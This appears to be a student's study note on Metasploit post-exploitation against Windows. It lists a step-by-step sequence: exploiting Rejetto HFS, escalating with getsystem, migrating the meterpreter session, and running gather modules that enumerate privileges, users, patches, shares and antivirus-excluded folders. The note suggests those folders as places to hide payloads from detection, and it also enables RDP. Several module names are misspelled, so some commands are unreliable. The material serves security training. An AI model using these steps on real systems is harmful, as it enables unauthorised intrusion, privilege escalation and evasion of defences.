- MSF provides us with post exploitation modules 
![[Pasted image 20230828081111.png]]

#### the basics - post exploitation modules 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip `
5) HttpFileServer httpd 2.3 is vulnerable: ` search rejetto ` and `use exploit/windows/http/rejetto_hfs_exec `
6) Meterpreter session 
	1) `sysinfo` 
	2) `getuid`
	3) `help` a meterpreter session on windows gives you more options
	4) `getsystem` can be used to elevate privileges 
	5) `show_mount` will display drives 
	6) `ps` 
	7) `migrate 2212` (you can migrate to upgrade your meterpreter session to x64 )
	8) `cd C:\\` and  `dir` 
7) upgrade the architecture:  x86 Meterpreter sessions are used on 32-bit systems and offer limited access to system resources, while x64 Meterpreter sessions are used on 64-bit systems and provide greater access to resources and system components.  
	- `search migrate`
	- `use post/windows/manage/migrate` (create new process and migrate to it)
	- `set session 1 `

##### post exploitation modules for windows: 
- `post/windows/gather/win_privs` will enumerate the priviliges of current user we have access to.  
	1) set session  

- `post/windows/gather/enum_logged_on_users` allows us to see what users are currently logged on 
	1) set session  

- `post/windows/gather/checkvm` will tell you if the target system is a virtual machine. If you find out that you are on a virtual machine than you can look into exploit modules to break out of the virtual machine and gain access to host operating system that is hosting the virtual machine. 
	- set session

- `post/windows/gather/enum_applications` will tell us what programs are installed on target system (you can check if the applications are vulnerable - if they are you can use that to elevate your priviliges )

- `loot`  will show you were the results of the modules run is stored 

- `post/windows/gather/enum_av_ecluded`  what folders are not scanned by anti-virus. This is handy because in these folders you can store your exploit code and payloads that you want to transfer to the target and execute on disk without being caught 

-  `post/windows/gather/enum_computers` enumerate computers that are part of the domain that the target is also part of

-  `post/windows/gather/enum_patces`  enumerate installed patches on target system
	- if this does not work: go into session -> `shell` this will give you command prompt -> `systeminfo`
	
- `post/windows/gather/enum_shares` enumerate shares 


-  `post/windows/manage/enabled_rdp` enable rdp on target - it will tell you if rdp is already enabled. 

